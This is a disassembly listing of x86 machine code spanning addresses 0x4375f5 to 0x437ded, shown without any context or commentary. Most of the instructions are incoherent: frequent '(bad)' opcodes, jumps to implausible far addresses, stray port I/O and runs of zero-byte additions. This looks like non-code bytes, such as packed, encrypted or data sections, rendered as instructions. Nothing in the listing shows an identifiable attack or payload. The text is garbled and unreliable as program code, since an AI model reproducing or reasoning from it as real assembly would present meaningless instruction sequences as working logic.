  4375f5:	inc    edx
  4375f6:	jns    0x43764b
  4375f8:	jl     0x437613
  4375fa:	stc    
  4375fb:	out    0x3,al
  4375fd:	clc    
  4375fe:	sub    eax,0xef24038b
  437603:	pop    ecx
  437604:	add    esp,DWORD PTR [edi+eiz*8]
  437607:	xor    DWORD PTR [edx],ebp
  437609:	mov    al,ds:0xb6fb00af
  43760e:	prefetch BYTE PTR [edx-0x74]
  437612:	xchg   BYTE PTR [esi+0x142a7b85],al
  437618:	jmp    0xefdf4293
  43761d:	pop    esi
  43761e:	out    dx,al
  43761f:	(bad)  
  437620:	call   0x9cc84eb1
  437625:	push   ds
  437626:	jge    0x4375dc
  437628:	pop    ecx
  437629:	gs std 
  43762b:	(bad)  
  43762c:	call   0xd593e8c4
  437631:	jbe    0x437635
  437633:	test   DWORD PTR [eax],ebx
  437635:	jp     0x4375f2
  437637:	xchg   DWORD PTR [esi+edi*8-0x7683a32],edx
  43763e:	jge    0x43768b
  437640:	or     eax,0xa5b07668
  437645:	jecxz  0x4375ca
  437647:	stc    
  437648:	lahf   
  437649:	mov    edi,DWORD PTR [ebp-0x1d]
  43764c:	xchg   esp,eax
  43764d:	mov    ebx,0x4bed537d
  437652:	aaa    
  437653:	or     BYTE PTR [edi+0x40],al
  437656:	outs   dx,BYTE PTR ds:[esi]
  437657:	mov    BYTE PTR ds:0x0,bh
  43765d:	add    BYTE PTR [edx+0x3232f983],bh
  437663:	lahf   
  437664:	pop    ebx
  437665:	stos   BYTE PTR es:[edi],al
  437666:	sub    DWORD PTR [esi-0x50],esp
  437669:	and    eax,0x1ff983a2
  43766e:	dec    edx
  43766f:	jge    0x437654
  437671:	adc    al,0xba
  437673:	mov    dh,0xcc
  437675:	popf   
  437676:	retf   0xccb6
  437679:	mov    ch,0xc2
  43767b:	mov    dh,0xcc
  43767d:	lods   eax,DWORD PTR ds:[esi]
  43767e:	mov    edx,0xf23cccb6
  437683:	xchg   esi,eax
  437684:	jge    0x437703
  437686:	dec    esi
  437687:	jle    0x4376d8
  437689:	add    BYTE PTR [eax-0x34],dl
  43768c:	sbb    BYTE PTR [ecx],0xe7
  43768f:	mov    BYTE PTR [edi],0x89
  437692:	jno    0x4376fa
  437694:	adc    DWORD PTR [ecx],0xffffffd5
  437697:	retf   0x8bdb
  43769a:	std    
  43769b:	cli    
  43769c:	dec    ebp
  43769d:	mov    DWORD PTR [ecx],eax
  43769f:	pop    edi
  4376a0:	adc    DWORD PTR [ecx+0x14],0xffffffc8
  4376a4:	cmp    BYTE PTR [ecx+0x2c],0xac
  4376a8:	ret    0x189
  4376ab:	pop    ebx
  4376ac:	pop    es
  4376ad:	mov    bh,0x7d
  4376af:	add    al,0xc2
  4376b1:	sar    DWORD PTR [esi-0x6a35fb71],0x7
  4376b8:	cmp    al,0xb
  4376ba:	or     al,0xff
  4376bc:	or     BYTE PTR [eax-0x67c34],0x0
  4376c3:	add    BYTE PTR [eax],al
  4376c5:	add    BYTE PTR [eax],al
  4376c7:	push   ebp
  4376c8:	pop    es
  4376c9:	inc    esp
  4376ca:	or     ebx,esp
  4376cc:	inc    BYTE PTR [eax-0x67bdb78]
  4376d2:	jmp    DWORD PTR [ebp+0x7]
  4376d5:	dec    esp
  4376d6:	or     ebx,esp
  4376d8:	inc    BYTE PTR [eax-0x67c1378]
  4376de:	inc    DWORD PTR [ebp+0x6]
  4376e1:	push   esp
  4376e2:	or     ecx,esp
  4376e4:	inc    BYTE PTR [eax-0x67a9b78]
  4376ea:	call   DWORD PTR [edi]
  4376ec:	push   es
  4376ed:	push   esp
  4376ee:	adc    al,0x8c
  4376f0:	inc    BYTE PTR [edx+0x2d22494]
  4376f6:	add    BYTE PTR [ebp+ebp*4+0x421566c2],bl
  4376fd:	mov    eax,DWORD PTR [edx]
  4376ff:	pop    es
  437700:	push   es
  437701:	push   esp
  437702:	adc    al,0x8c
  437704:	(bad)  
  437705:	sub    dh,dh
  437707:	jne    0x437733
  437709:	jne    0x437766
  43770b:	dec    ebp
  43770c:	jecxz  0x437716
  43770e:	cld    
  43770f:	in     al,dx
  437710:	jle    0x437697
  437712:	jg     0x437770
  437714:	mov    edi,0x68750003
  437719:	jp     0x437771
  43771b:	je     0x437788
  43771d:	std    
  43771e:	mov    ch,cl
  437720:	repz das 
  437722:	add    eax,0x53766b75
  437727:	sub    DWORD PTR [esi+0xfdc9],edx
  43772d:	add    BYTE PTR [eax],al
  43772f:	add    BYTE PTR [edx],ch
  437731:	ins    BYTE PTR es:[edi],dx
  437732:	fmul   st(6),st
  437734:	jbe    0x43776b
  437736:	jne    0x43778b
  437738:	or     ebx,esi
  43773a:	cmp    al,dh
  43773c:	in     eax,0xe4
  43773e:	cmp    ah,dh
  437740:	(bad)  
  437741:	pop    edx
  437742:	add    BYTE PTR [ecx+0x901fcb1],dh
  437748:	ret    0x7caf
  43774b:	(bad)  
  43774c:	xor    eax,0x737ac054
  437751:	test   eax,0xfeecc97c
  437756:	test   BYTE PTR [edx-0x14],ah
  437759:	scas   eax,DWORD PTR es:[edi]
  43775a:	je     0x43775a
  43775c:	(bad)  
  43775d:	sahf   
  43775e:	xchg   ebp,eax
  43775f:	jns    0x437793
  437761:	in     al,0x8
  437763:	in     al,0x5b
  437765:	push   0x74794881
  43776a:	std    
  43776b:	jmp    DWORD PTR [esi+0x61]
  43776e:	int3   
  43776f:	shr    BYTE PTR [ecx],1
  437771:	gs jl  0x437762
  437774:	dec    esi
  437775:	sar    BYTE PTR [ebx+edi*2-0x6b],0xf4
  43777a:	shl    BYTE PTR [eax-0x7336ff7e],1
  437780:	jbe    0x437723
  437782:	add    BYTE PTR [ecx+0x7be802b2],ch
  437788:	int    0x18
  43778a:	out    0x3,eax
  43778c:	clc    
  43778d:	into   
  43778e:	mov    dl,0x86
  437790:	xor    dh,dh
  437792:	test   BYTE PTR [eax],0x0
  437795:	add    BYTE PTR [eax],al
  437797:	add    BYTE PTR [eax],al
  437799:	and    al,0xd6
  43779b:	push   edi
  43779c:	add    eax,0x60ea5758
  4377a1:	and    al,0x3
  4377a3:	push   edi
  4377a4:	pop    edi
  4377a5:	addr16 add ah,bh
  4377a8:	jl     0x437768
  4377aa:	jle    0x43781a
  4377ac:	push   ss
  4377ad:	cmp    eax,0x7997a485
  4377b2:	and    DWORD PTR [edi+ebx*4-0x669b715a],0x32b866c
  4377bd:	jne    0x4377c1
  4377bf:	ins    BYTE PTR es:[edi],dx
  4377c0:	dec    edi
  4377c1:	lea    edi,[esi]
  4377c3:	fiadd  WORD PTR [ebx]
  4377c5:	jne    0x437754
  4377c7:	pushf  
  4377c8:	(bad)  
  4377c9:	mov    edx,0xad4f65e8
  4377ce:	ds out dx,al
  4377d0:	add    esi,DWORD PTR [ebp+0x2]
  4377d3:	fs ja  0x437813
  4377d6:	fiadd  WORD PTR ds:[ebx]
  4377d9:	jne    0x4377d2
  4377db:	xlat   BYTE PTR ds:[ebx]
  4377dc:	jle    0x4377ef
  4377de:	es out 0x3,eax
  4377e1:	jne    0x4377e5
  4377e3:	popfw  
  4377e5:	retf   
  4377e6:	leave  
  4377e7:	add    BYTE PTR [ebx+ecx*4+0x57965b02],0x85
  4377ef:	arpl   WORD PTR [edi+ebp*2],di
  4377f2:	or     eax,0xbaab03e7
  4377f7:	retf   0x758f
  4377fa:	add    cl,BYTE PTR [ecx+0x5]
  4377fd:	add    BYTE PTR [eax],al
  4377ff:	add    BYTE PTR [eax],al
  437801:	add    BYTE PTR [ecx],al
  437803:	retf   0xfafa
  437806:	xchg   edx,eax
  437807:	add    BYTE PTR [eax],0x62
  43780a:	iret   
  43780b:	jecxz  0x43780b
  43780d:	(bad)  
  43780f:	imul   edi,esi,0x6b
  437812:	jecxz  0x43780e
  437814:	mov    al,0x72
  437816:	lods   al,BYTE PTR ds:[esi]
  437817:	jle    0x43779c
  437819:	mov    ebx,0xc86eb8d
  43781e:	adc    eax,0xd9c6b10a
  437823:	sti    
  437824:	repz fs add dh,bh
  437828:	push   ebx
  437829:	bound  esi,QWORD PTR [edx+esi*2-0x213eca75]
  437830:	add    al,0xe9
  437832:	jbe    0x4377bf
  437834:	xchg   ebp,eax
  437835:	jmp    0x62437ab0
  43783a:	imul   edi,DWORD PTR [esi-0x7],0xffffff9c
  43783e:	push   es
  43783f:	(bad)  
  437840:	jmp    0xe0371232
  437845:	add    dh,BYTE PTR [edx+ebp*2-0x4cf5f987]
  43784c:	jl     0x4378b0
  43784e:	ja     0x4377db
  437850:	je     0x4378c4
  437852:	ja     0x437889
  437854:	not    BYTE PTR [ebp-0x3d29791f]
  43785a:	sbb    eax,DWORD PTR [esi+0x5aa462f5]
  437860:	or     DWORD PTR [esi],edi
  437862:	jne    0x4377e9
  437864:	or     DWORD PTR [esi+0x0],ecx
  437867:	add    BYTE PTR [eax],al
  437869:	add    BYTE PTR [eax],al
  43786b:	add    BYTE PTR [eax+0x7fc341b1],al
  437871:	stc    
  437872:	xchg   DWORD PTR [ecx+0x14],eax
  437875:	stc    
  437876:	xor    al,0xdd
  437878:	test   DWORD PTR [ebx-0x2b],edi
  43787b:	das    
  43787c:	repz fild QWORD PTR [ebx+edi*8-0xd]
  437881:	mov    ebx,0x7d6e8562
  437886:	add    bl,al
  437888:	add    DWORD PTR [edx-0x77],eax
  43788b:	push   ecx
  43788c:	mov    ds:0x3063966d,al
  437891:	push   ebx
  437892:	mov    edi,DWORD PTR [ecx-0x3f3344ce]
  437898:	mov    edi,0xbf20cccc
  43789d:	int3   
  43789e:	int3   
  43789f:	test   eax,0xe083ebfb
  4378a4:	jae    0x4378f2
  4378a6:	push   esi
  4378a7:	jnp    0x4378a4
  4378a9:	lock mov edx,DWORD PTR [eax+eax*4]
  4378ad:	mov    al,0x47
  4378af:	pop    esi
  4378b0:	push   esp
  4378b1:	retf   
  4378b2:	(bad)  
  4378b3:	cdq    
  4378b4:	mov    ?,edi
  4378b6:	call   ebx
  4378b8:	nop
  4378b9:	add    DWORD PTR [ebp-0x34],0x91074282
  4378c0:	adc    DWORD PTR [eax*4-0x46f7e5b4],eax
  4378c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4378c8:	add    eax,DWORD PTR [eax]
  4378ca:	add    BYTE PTR [ecx+0xb7fb13],ah
  4378d0:	add    BYTE PTR [eax],al
  4378d2:	add    BYTE PTR [eax],al
  4378d4:	inc    ebx
  4378d5:	nop
  4378d6:	add    BYTE PTR [eax],al
  4378d8:	cmp    bh,dh
  4378da:	inc    ebx
  4378db:	lahf   
  4378dc:	or     cl,BYTE PTR [edx-0xc9bf02d]
  4378e2:	(bad)  
  4378e3:	(bad)  
  4378e4:	fadd   QWORD PTR [ebx-0x1f0f941]
  4378ea:	je     0x4378e8
  4378ec:	adc    cl,BYTE PTR [bx+si]
  4378ef:	mov    ecx,esi
  4378f1:	xchg   esi,eax
  4378f2:	sbb    DWORD PTR [ebp-0x34],0xfffffff8
  4378f6:	mov    edx,0x78ef18b
  4378fb:	mov    bh,0x77
  4378fd:	les    esi,FWORD PTR [edx]
  4378ff:	rcl    DWORD PTR [ecx+0xa],1
  437902:	xor    eax,ebx
  437904:	jne    0x4378e3
  437906:	and    DWORD PTR ds:0x61f5cdcb,esi
  43790c:	je     0x4378eb
  43790e:	cmp    BYTE PTR [edi+edi*2+0x69],0xfd
  437913:	in     al,0x5a
  437915:	out    dx,al
  437916:	ret    
  437917:	je     0x437984
  437919:	je     0x43795d
  43791b:	clc    
  43791c:	add    DWORD PTR [ecx+0x23],esi
  43791f:	stc    
  437920:	stc    
  437921:	in     al,0xf
  437923:	push   es
  437924:	jne    0x437991
  437926:	and    edi,ecx
  437928:	cli    
  437929:	iret   
  43792a:	cmc    
  43792b:	call   FWORD PTR [edx-0x6f]
  43792e:	icebp  
  43792f:	jl     0x437980
  437931:	jb     0x43793f
  437933:	pop    es
  437934:	shl    esp,cl
  437936:	add    al,0x0
  437939:	add    BYTE PTR [eax],al
  43793b:	add    BYTE PTR [eax],al
  43793d:	outs   dx,DWORD PTR ds:[esi]
  43793e:	imul   edi,ebp,0xffffffe4
  437941:	jb     0x437990
  437943:	mov    WORD PTR [ecx-0x28dc7],es
  437949:	cmp    WORD PTR [ebp+0x43],si
  43794d:	sbb    eax,0x6f73a6e7
  437952:	xor    BYTE PTR [esi+0x0],0x75
  437956:	imul   edi,DWORD PTR [edx+0x6e],0x76
  43795a:	shl    cl,0x34
  43795d:	ss mov bh,0xf7
  437960:	mov    dh,0x73
  437962:	imul   edi,ebp,0xffffffff
  437965:	add    BYTE PTR [ebx-0x2d821a76],bl
  43796b:	add    al,BYTE PTR [eax]
  43796d:	jne    0x4379da
  43796f:	jp     0x4379e0
  437971:	fsubr  st,st(0)
  437973:	inc    eax
  437974:	cld    
  437975:	jns    0x4379f3
  437977:	cmp    dh,ah
  437979:	inc    eax
  43797a:	jmp    0x4379a6
  43797c:	pop    edx
  43797d:	push   ds
  43797e:	loopne 0x437920
  437980:	pop    ebx
  437981:	mov    dh,0x2
  437983:	mov    bl,0xbf
  437985:	ror    DWORD PTR [esi-0x55],0xbf
  437989:	mov    ecx,0x91793c4e
  43798e:	cmp    DWORD PTR [ebx+0x6dd429ef],0x19b57c91
  437998:	add    bl,BYTE PTR [eax+0x50]
  43799b:	sbb    bh,BYTE PTR [ecx-0x76]
  43799e:	inc    ebp
  43799f:	and    al,0xa0
  4379a1:	add    BYTE PTR [eax],al
  4379a3:	add    BYTE PTR [eax],al
  4379a5:	add    BYTE PTR [ebp+edi*2-0x5e],bh
  4379a9:	mov    edx,?
  4379ab:	ficom  WORD PTR [edx-0x55fa4c82]
  4379b1:	inc    esi
  4379b2:	pop    ebp
  4379b3:	push   es
  4379b4:	out    0x3,eax
  4379b6:	jne    0x43793f
  4379b8:	sahf   
  4379b9:	push   ss
  4379ba:	cmp    DWORD PTR [ebx+0x275036d],0x13d46aa
  4379c4:	out    0x3,eax
  4379c6:	jne    0x43794f
  4379c8:	(bad)  
  4379c9:	cld    
  4379ca:	cli    
  4379cb:	ss in  al,0x3
  4379ce:	jne    0x437951
  4379d0:	sub    DWORD PTR ds:0x93d48bb4,eax
  4379d6:	repnz dec BYTE PTR [esi+0x48]
  4379da:	adc    bh,BYTE PTR [ebp-0x19]
  4379dd:	add    esi,eax
  4379df:	jl     0x437a3f
  4379e1:	push   cs
  4379e2:	add    eax,0xf1cc720d
  4379e7:	neg    BYTE PTR [edx]
  4379e9:	add    al,al
  4379eb:	mov    dl,BYTE PTR [edi+eiz*4+0x7a1afef2]
  4379f2:	inc    esi
  4379f3:	jle    0x4379c3
  4379f5:	mov    dl,0x5e
  4379f7:	or     bh,BYTE PTR [esi-0xd79836c]
  4379fd:	push   es
  4379fe:	jne    0x437a02
  437a00:	add    BYTE PTR [edx+0x5c097a8b],dh
  437a06:	push   ebx
  437a07:	add    al,BYTE PTR [eax]
  437a09:	jmp    0x437a0e
  437a0e:	add    BYTE PTR ds:0x76e924a6,ch
  437a14:	add    al,BYTE PTR [eax]
  437a16:	out    0x47,al
  437a18:	mov    esi,0x7c9b4fb0
  437a1d:	stc    
  437a1e:	jb     0x437a31
  437a20:	mov    esi,0xb476e912
  437a25:	adc    cl,ch
  437a27:	jbe    0x437a2b
  437a29:	and    eax,0x7a46aa96
  437a2e:	inc    esp
  437a2f:	outs   dx,BYTE PTR ds:[esi]
  437a30:	mov    bl,0xb4
  437a32:	pop    ecx
  437a33:	jge    0x437a39
  437a35:	add    cl,ch
  437a37:	xchg   esp,eax
  437a38:	test   edx,edx
  437a3a:	pop    es
  437a3b:	and    bl,BYTE PTR [ebp-0x7b]
  437a3e:	xor    DWORD PTR [ecx-0x1e],edx
  437a41:	push   es
  437a42:	pop    ecx
  437a43:	mov    ecx,0x3fe90010
  437a48:	mov    dl,0x98
  437a4a:	xor    DWORD PTR [edi+0x7c],eax
  437a4d:	stc    
  437a4e:	jb     0x437ab9
  437a50:	push   ss
  437a51:	mov    ch,bh
  437a53:	and    DWORD PTR [ebx+0x40],edi
  437a56:	std    
  437a57:	pop    ds
  437a58:	mov    dl,0x98
  437a5a:	nop
  437a5b:	daa    
  437a5c:	jl     0x437a57
  437a5e:	jb     0x437ab1
  437a60:	push   ss
  437a61:	test   DWORD PTR [ecx-0x27e37bf2],ebx
  437a67:	adc    DWORD PTR [edx+0x276d7bc],0xffffffaf
  437a6e:	stc    
  437a6f:	inc    ebx
  437a70:	jnp    0x437a6b
  437a72:	jmp    0x437a77
  437a77:	add    BYTE PTR [esi+0x7b],dh
  437a7a:	push   ecx
  437a7b:	std    
  437a7c:	rol    BYTE PTR [ebp+0x62],0x3a
  437a80:	inc    DWORD PTR [edi-0x7049ffb4]
  437a86:	pop    esi
  437a87:	mov    DWORD PTR [esi+ecx*8-0x333fff3],ecx
  437a8e:	ins    BYTE PTR es:[edi],dx
  437a8f:	in     al,0x77
  437a91:	jb     0x437af2
  437a93:	mov    esi,DWORD PTR [eax]
  437a95:	iret   
  437a96:	jnp    0x437aa2
  437a98:	pushf  
  437a99:	call   FWORD PTR [ebp-0x2d]
  437a9c:	scas   al,BYTE PTR es:[edi]
  437a9d:	and    DWORD PTR [ecx],eax
  437a9f:	nop
  437aa0:	add    al,0x72
  437aa2:	stc    
  437aa3:	call   FWORD PTR [edi-0x37a2de48]
  437aa9:	inc    BYTE PTR [edi-0x5d44]
  437aaf:	push   cs
  437ab0:	adc    DWORD PTR [eax],esp
  437ab2:	idiv   edi
  437ab4:	sbb    ebx,DWORD PTR [esi-0xa3fbf7]
  437aba:	jl     0x437ab2
  437abc:	pop    ebx
  437abd:	sti    
  437abe:	ret    0x4c01
  437ac1:	push   DWORD PTR [edx]
  437ac3:	jne    0x437aad
  437ac5:	ja     0x437b44
  437ac7:	stos   BYTE PTR es:[edi],al
  437ac8:	pop    esp
  437ac9:	(bad)  
  437aca:	dec    DWORD PTR [esi]
  437acc:	xor    ebx,0xffffffaf
  437acf:	jle    0x437b27
  437ad1:	(bad)  
  437ad2:	(bad)  
  437ad3:	mov    esi,0xffffff2c
  437ad8:	xchg   DWORD PTR [ebp+0x4d81],ecx
  437ade:	add    BYTE PTR [eax],al
  437ae0:	add    ah,al
  437ae2:	cld    
  437ae3:	xchg   DWORD PTR [edx+eiz*1+0x4b3affff],edi
  437aea:	or     DWORD PTR [eax+0xf],ebp
  437aed:	sub    ebx,0xffffffaf
  437af0:	jl     0x437b08
  437af2:	(bad)  
  437af3:	dec    DWORD PTR [eax-0x2ca16d1f]
  437af9:	jle    0x437af7
  437afb:	inc    edi
  437afc:	or     BYTE PTR [ebp-0x3e],ah
  437aff:	jecxz  0x437b67
  437b01:	jne    0x437b65
  437b03:	ins    DWORD PTR es:[edi],dx
  437b04:	mov    eax,0x84fd6983
  437b09:	and    eax,0xd807b5d
  437b0e:	push   ebx
  437b0f:	std    
  437b10:	(bad)  
  437b11:	in     eax,dx
  437b12:	ins    BYTE PTR es:[edi],dx
  437b13:	hlt    
  437b14:	test   BYTE PTR [eax],dh
  437b16:	add    eax,0xf0895804
  437b1b:	or     edx,DWORD PTR [esi+edi*8]
  437b1e:	xor    ah,bh
  437b20:	test   DWORD PTR ds:0x9affee92,eax
  437b26:	loopne 0x437b17
  437b28:	or     dh,bh
  437b2a:	fadd   DWORD PTR [edi+0x12]
  437b2d:	jne    0x437b98
  437b2f:	jl     0x437bac
  437b31:	xchg   ecx,eax
  437b32:	imul   esp,DWORD PTR ds:0xdb58c414,0x97bcdbc5
  437b3c:	test   DWORD PTR [eax+0x6f5471a3],edi
  437b42:	fwait
  437b43:	jne    0x437ad5
  437b45:	add    BYTE PTR [eax],al
  437b47:	add    BYTE PTR [eax],al
  437b49:	add    BYTE PTR [ecx],bl
  437b4b:	jb     0x437b4a
  437b4d:	(bad)  
  437b4e:	(bad)  
  437b4f:	push   ss
  437b50:	mov    BYTE PTR [edx-0x4],ah
  437b53:	ret    
  437b54:	dec    ebx
  437b55:	adc    dh,BYTE PTR [ebp+0x6b]
  437b58:	pushf  
  437b59:	pop    ds
  437b5a:	shl    esp,cl
  437b5c:	inc    edi
  437b5d:	mov    al,0xb1
  437b5f:	jne    0x437b5e
  437b61:	call   DWORD PTR [ebx-0x127a60c4]
  437b67:	(bad)  
  437b68:	out    dx,al
  437b69:	call   FWORD PTR [edx]
  437b6b:	inc    edx
  437b6c:	div    BYTE PTR [edi-0x2a633]
  437b72:	jbe    0x437b1a
  437b74:	test   DWORD PTR [edi-0x121013],eax
  437b7a:	cli    
  437b7b:	add    al,0xb3
  437b7d:	xchg   DWORD PTR [eax+0x2],ecx
  437b80:	and    edi,ecx
  437b82:	and    eax,0xe2fe598b
  437b87:	jns    0x437bdb
  437b89:	hlt    
  437b8a:	fidivr DWORD PTR [ecx-0x19]
  437b8d:	fmul   st(3),st
  437b8f:	mov    esi,DWORD PTR [ebx+ecx*4-0xdc47510]
  437b96:	ret    0xae79
  437b99:	mov    eax,0x50d9e13f
  437b9e:	add    eax,0x7503edb7
  437ba3:	mov    esi,DWORD PTR [eax+ebx*4]
  437ba6:	pop    ss
  437ba7:	push   ebp
  437ba8:	lds    edi,FWORD PTR [ebp+ebp*1+0xa]
  437bac:	pusha  
  437bad:	add    BYTE PTR ds:[eax],al
  437bb0:	add    BYTE PTR [eax],al
  437bb2:	add    BYTE PTR [ecx-0x328c1020],bl
  437bb8:	adc    bh,ah
  437bba:	add    edi,eax
  437bbc:	rcr    dl,cl
  437bbe:	jge    0x437bb5
  437bc0:	mov    edx,0x8a7503d1
  437bc5:	jmp    0x437bb9
  437bc7:	icebp  
  437bc8:	mov    esi,0xebd0282
  437bcd:	pop    esi
  437bce:	or     eax,DWORD PTR [ecx-0x703e073]
  437bd4:	xchg   ecx,eax
  437bd5:	inc    eax
  437bd6:	icebp  
  437bd7:	dec    edx
  437bd8:	jns    0x437c49
  437bda:	out    dx,eax
  437bdb:	ins    DWORD PTR es:[edi],dx
  437bdc:	lea    edx,[edi+0x47]
  437bdf:	addr16 add ah,bh
  437be2:	jl     0x437b92
  437be4:	callw  0xfd13
  437be8:	mov    bl,0xf7
  437bea:	fnstsw WORD PTR [eax]
  437bec:	loopne 0x437c23
  437bee:	cwde   
  437bef:	lock (bad) 
  437bf1:	dec    esi
  437bf2:	jbe    0x437b9d
  437bf4:	or     al,0x37
  437bf6:	jp     0x437bdd
  437bf8:	mov    ch,0xd1
  437bfa:	add    esi,DWORD PTR [ebp-0x73]
  437bfd:	add    BYTE PTR [edx+esi*8+0x3e7186e3],bl
  437c04:	adc    al,0x0
  437c06:	jmp    0x72a58c14
  437c0b:	cs mov dh,0x6
  437c0e:	jmp    0x7106089
  437c13:	xchg   esp,eax
  437c14:	add    DWORD PTR [eax+0x41],edi
  437c1a:	add    BYTE PTR [eax],al
  437c1c:	les    edi,FWORD PTR [eax-0x7]
  437c1f:	jmp    0x1432:0x61877a8b
  437c26:	add    cl,ch
  437c28:	xor    DWORD PTR [edx+0x276ffbc],ecx
  437c2e:	jge    0x437bdb
  437c30:	in     al,dx
  437c31:	div    dh
  437c33:	out    0x70,eax
  437c35:	(bad)  
  437c36:	xchg   BYTE PTR [ebp*8+0xecbcce3],dh
  437c3d:	retf   0x7007
  437c40:	xor    al,0x5e
  437c42:	(bad)  
  437c43:	loopne 0x437c4b
  437c45:	mov    edx,0x7d76e912
  437c4a:	push   eax
  437c4b:	std    
  437c4c:	in     al,dx
  437c4d:	cmp    BYTE PTR [eax-0x77fd8909],0xed
  437c54:	popa   
  437c55:	jg     0x437c9a
  437c57:	test   DWORD PTR [eax-0x26],edi
  437c5a:	adc    esi,DWORD PTR [edx+0x79]
  437c5d:	push   cs
  437c5e:	xchg   BYTE PTR [ecx-0x50],bl
  437c61:	adc    al,0x0
  437c63:	jmp    0x614b4727
  437c68:	and    eax,0xbd79850b
  437c6d:	adc    al,0x0
  437c6f:	jmp    0xe92f7813
  437c74:	dec    esi
  437c75:	push   cs
  437c76:	scas   eax,DWORD PTR es:[edi]
  437c77:	stc    
  437c78:	sub    al,0x3e
  437c7a:	bound  eax,QWORD PTR [eax]
  437c7c:	outs   dx,DWORD PTR ds:[esi]
  437c7d:	(bad)  
  437c7e:	jnp    0x437c42
  437c80:	add    BYTE PTR [eax],al
  437c82:	add    BYTE PTR [eax],al
  437c84:	add    BYTE PTR [esi],bh
  437c86:	cmc    
  437c87:	(bad)  
  437c88:	mov    esp,0x6600041a
  437c8d:	push   ebp
  437c8e:	(bad)  
  437c8f:	mov    bh,0x16
  437c91:	fadd   QWORD PTR [ebx]
  437c93:	loope  0x437ce5
  437c95:	into   
  437c96:	add    eax,DWORD PTR [eax]
  437c98:	data16 lahf 
  437c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c9b:	pop    esi
  437c9c:	or     DWORD PTR [esi+eax*8+0xd],ecx
  437ca0:	add    ah,bl
  437ca2:	test   BYTE PTR [ecx-0x4b99afe],bh
  437ca8:	dec    esp
  437caa:	ror    BYTE PTR [edi],0x0
  437cad:	pushf  
  437cae:	add    edi,DWORD PTR [ebx-0x6]
  437cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437cb2:	jo     0x437c3c
  437cb4:	sbb    DWORD PTR [ebp-0x4f0fffd],ecx
  437cba:	sti    
  437cbb:	mov    ecx,0x23039c0a
  437cc0:	stc    
  437cc1:	add    eax,0x48bf83a
  437cc6:	mov    edi,0x4c8c000d
  437ccb:	enter  0xbb7e,0x6f
  437ccf:	mov    al,0x90
  437cd1:	sbb    al,0x79
  437cd3:	stc    
  437cd4:	jmp    ebp
  437cd6:	xor    ch,ah
  437cd8:	popw   ds
  437cda:	mov    eax,ds:0xf6544883
  437cdf:	cmp    al,0xe4
  437ce1:	jp     0x437d58
  437ce3:	mov    DWORD PTR [eax-0x74fffcd6],edi
  437ce9:	add    BYTE PTR [eax],al
  437ceb:	add    BYTE PTR [eax],al
  437ced:	add    BYTE PTR [edx+esi*2-0x7d],bl
  437cf1:	and    BYTE PTR [ebp+eiz*2-0x7],0xff
  437cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437cf7:	ja     0x437d03
  437cf9:	mov    ebx,ecx
  437cfb:	xchg   esi,eax
  437cfc:	stc    
  437cfd:	push   edi
  437cfe:	jne    0x437d75
  437d00:	jbe    0x437d7a
  437d02:	imul   esp,esp,0xd8ff0834
  437d08:	dec    ebx
  437d09:	adc    dh,BYTE PTR [ebp+0x69]
  437d0c:	jne    0x437d22
  437d0e:	push   0xffffffe4
  437d10:	ins    BYTE PTR es:[edi],dx
  437d11:	mov    esp,0x84fd698b
  437d16:	push   0x8958040d
  437d1b:	(bad)  
  437d1d:	and    eax,0xe9ae86af
  437d22:	(bad)  
  437d23:	xchg   ebp,eax
  437d24:	test   DWORD PTR [ebx-0x78728cdf],ecx
  437d2a:	in     eax,0x34
  437d2c:	jmp    0x437d2d
  437d2e:	mov    edx,0x1bfc2fe3
  437d33:	loop   0x437d79
  437d35:	mov    eax,0xe4fd6983
  437d3a:	push   ebp
  437d3b:	mov    edi,0x62b5b876
  437d40:	std    
  437d41:	call   FWORD PTR [ebx]
  437d43:	mov    esp,0x7cfd859b
  437d48:	jmp    0xbdb7:0xf4be82ff
  437d4f:	push   esi
  437d50:	std    
  437d51:	inc    DWORD PTR [eax]
  437d53:	add    BYTE PTR [eax],al
  437d55:	add    BYTE PTR [eax],al
  437d57:	jbe    0x437d6f
  437d59:	mov    WORD PTR [edi-0x162003],es
  437d5f:	(bad)  
  437d61:	jnp    0x437d1f
  437d63:	sub    DWORD PTR [ebx-0x3],0x7c
  437d67:	aaa    
  437d68:	xchg   DWORD PTR [edi-0x9],edi
  437d6b:	js     0x437d6a
  437d6d:	daa    
  437d6e:	xchg   DWORD PTR [eax+0x57cd1a87],ebp
  437d74:	loope  0x437db1
  437d76:	or     ah,bh
  437d78:	push   ds
  437d79:	mov    al,ds:0x77027c62
  437d7e:	dec    esp
  437d7f:	xchg   DWORD PTR [edx],eax
  437d81:	out    0x78,eax
  437d83:	lds    ecx,FWORD PTR [esi]
  437d85:	pop    ebp
  437d86:	test   ch,cl
  437d88:	or     al,0xe7
  437d8a:	add    edi,ebp
  437d8c:	(bad)  
  437d8d:	xlat   BYTE PTR ds:[ebx]
  437d8e:	js     0x437d46
  437d90:	pop    esi
  437d91:	call   0xafccdec1
  437d96:	out    dx,eax
  437d97:	clc    
  437d98:	xchg   edx,eax
  437d99:	jo     0x437d89
  437d9b:	jmp    0xf38a:0x6d3c6e75
  437da2:	hlt    
  437da3:	icebp  
  437da4:	xchg   edx,eax
  437da5:	push   ebx
  437da6:	out    dx,al
  437da7:	shl    BYTE PTR [ebp+0x5e],cl
  437daa:	pop    es
  437dab:	fld    DWORD PTR [ebx]
  437dad:	lahf   
  437dae:	out    dx,eax
  437daf:	adc    edx,DWORD PTR [ebx]
  437db1:	int    0xb9
  437db3:	push   edi
  437db4:	push   ecx
  437db5:	add    al,BYTE PTR [ecx+0x746071f3]
  437dbb:	add    BYTE PTR [eax],al
  437dbd:	add    BYTE PTR [eax],al
  437dbf:	add    cl,ch
  437dc1:	or     al,0xe7
  437dc3:	add    edx,DWORD PTR [edi]
  437dc5:	mov    ebx,DWORD PTR [edi-0x18fd78b5]
  437dcb:	call   0x5117:0x3e7035a
  437dd2:	lds    ebx,FWORD PTR ds:0xed7f927a
  437dd8:	jp     0x437e4f
  437dda:	retw   0x6a70
  437dde:	fadd   DWORD PTR [edx]
  437de0:	jne    0x437de4
  437de2:	repnz dec esp
  437de4:	in     eax,dx
  437de5:	cmp    ebp,ebp
  437de7:	add    esi,DWORD PTR [ebp+0x29]
  437dea:	nop
  437deb:	jp     0x437dab
  437ded:	jp     0x437e4d
